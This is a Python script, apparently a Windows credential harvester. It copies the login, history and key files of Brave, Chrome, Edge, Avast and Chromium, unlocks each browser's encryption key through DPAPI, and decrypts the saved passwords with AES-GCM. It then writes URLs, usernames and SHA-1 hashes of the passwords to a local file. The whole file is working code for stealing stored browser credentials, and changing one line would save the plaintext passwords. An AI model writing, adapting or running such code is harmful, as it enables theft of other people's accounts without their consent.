import json
import sqlite3

from base64 import b64decode
from hashlib import sha1
from pathlib import Path
from os import getenv
from shutil import copy

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

class SQLite():
    ''' Class is a wrapper for sqlite3 context manager. 
        Returs sqlite3.connection().cursor object ready to execute query
        Usage: with SQLite() as c:
                  c.execute('SELECT * FROM table')
    '''

    def __init__(self, db_file=None):
        self.db_file = db_file

    def __enter__(self):
        self.conn = sqlite3.connect(self.db_file)
        return self.conn.cursor()

    def __exit__(self, type, value, traceback):
        self.conn.commit()
        self.conn.close()


class Browser:
    PASSWD_DB_FILENAME = 'Login Data'
    HISTORY_DB_FILENAME = 'History'
    BOOKMARKS_DB_FILENAME = 'Bookmarks'
    LOCAL_STATE_FILENAME = 'Local State'

    def __init__(self, name):
        self.name = name
        self.local_copy_dir = None  # will be set from Harvester
        self.state = None
        self.passwords = dict()

    @property
    def is_installed(self):
        return self.path.is_dir()

    @property
    def history_file(self):
        return Path(self.path, self.HISTORY_DB_FILENAME)

    @property
    def passwd_file(self):
        return Path(self.path, self.PASSWD_DB_FILENAME)

    @property
    def state_file(self):
        return Path(self.path.parent, self.LOCAL_STATE_FILENAME)

    @property
    def path(self):
        p = {
            'brave': ('BraveSoftware', 'Brave-Browser'),
            'chrome': ('Google', 'Chrome'),
            'edge': ('Microsoft', 'Edge'),
            'avast': ('AVAST Software', 'Browser'),
            'chromium': ('Chromiumm',)}
        ud = ('User Data', 'Default')

        return Path(getenv('LOCALAPPDATA'), *p[self.name], *ud)


class Harvester:
    BRAVE = Browser('brave')
    CHROME = Browser('chrome')
    EDGE = Browser('edge')
    AVAST = Browser('avast')
    CHROMIUM = Browser('chromium')

    HARVEST_FOLDER = Path(getenv("COMPUTERNAME"))

    WIN_DPAPI_PREFIX = b'\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB'
    C_DPAPI_PREFIX = b'DPAPI'

    def __init__(self, ):
        self.passwords = dict()

    def _make_local_copies(self, browser):
        local_dir = Path('harvest', self.HARVEST_FOLDER,
                         browser.name, '_raw_files')
        browser.local_copy_dir = local_dir

        # make dirs
        local_dir.mkdir(parents=True, exist_ok=True)

        # make local copies of files
        copy(browser.passwd_file, browser.local_copy_dir)
        copy(browser.history_file, browser.local_copy_dir)
        copy(browser.state_file, browser.local_copy_dir)

    def _fetch_browser_cipher_key(self, browser):
        with open(file=Path(browser.local_copy_dir, browser.LOCAL_STATE_FILENAME), mode='r') as f:
            data = json.load(f)
            browser.state = data

        try:
            _key = b64decode(browser.state['os_crypt']['encrypted_key'])

            if _key.startswith(self.C_DPAPI_PREFIX):
                browser.key = CryptUnprotectData(
                    _key[len(self.C_DPAPI_PREFIX):])[1]
            else:
                browser.key = _key

            with open(file=Path(browser.local_copy_dir, 'key.bin'), mode='wb') as f:
                f.write(browser.key)

        except:
            browser.key = None

    def _decrypt(self, browser, encrypted):
        VER_10_PREFIX = ('v10'.encode('utf-8'), 'v10'.encode('utf-16'))
        if browser.key:
            if not isinstance(encrypted, bytes):
                encrypted = bytes(encrypted.encode('utf-8'))

            if encrypted.startswith(VER_10_PREFIX):

                encrypted = encrypted[len(VER_10_PREFIX[0]):]
                n = 12
                nonce = encrypted[:n]
                encrypted = encrypted[n:-16]

                cipher = AES.new(browser.key, AES.MODE_GCM, nonce=nonce)

                decrypted = cipher.decrypt(encrypted)

            elif encrypted.startswith(self.WIN_DPAPI_PREFIX):
                try:
                    decrypted = CryptUnprotectData(encrypted, None, None, None, 0)[1]

                except:
                    decrypted = None
            else:
                decrypted = None

            return decrypted

    def read_passwords(self, browser):
        '''reads passwords from db file copy and saves to browser.passwords'''
        with SQLite(db_file=Path(browser.local_copy_dir, browser.PASSWD_DB_FILENAME)) as c:
            c.execute( 'SELECT origin_url, username_value, password_value FROM logins')
            passwords = c.fetchall()
        
        browser.passwords[browser.name] = []
        browser.passwd_count = 0
        m = lambda a : sha1(a).hexdigest()
        for url, uname, passwd_enc in passwords:
            passwd = self._decrypt(browser, passwd_enc)
            if passwd:
                passwd = passwd.decode()
                passwd = m(passwd.encode())
                cred = dict(zip(('url', 'username', 'passwd'), (url, uname, passwd)))

                browser.passwords[browser.name].append(cred)
                browser.passwd_count += 1

    def _dump_json(self, data, fname):
        if isinstance(data, dict):
            with open(fname, "w", encoding='utf-8') as f:
                json.dump(data, f, indent=4)

    def show_stats(self, browser):
        print( f'[+] {browser.name.upper()}: {browser.passwd_count} passwords recovered')

    def run(self):
        for b in [Harvester.BRAVE, Harvester.CHROME, Harvester.EDGE, Harvester.CHROMIUM, Harvester.AVAST]:
            if b.is_installed:
                self._make_local_copies(b)
                self._fetch_browser_cipher_key(b)
                self.read_passwords(browser=b)
                self._dump_json(
                    data=b.passwords,
                    fname=Path(b.local_copy_dir.parent, 'passwords.dat'))

                self.show_stats(b)


if __name__ == '__main__':
    harvester = Harvester()
    harvester.run()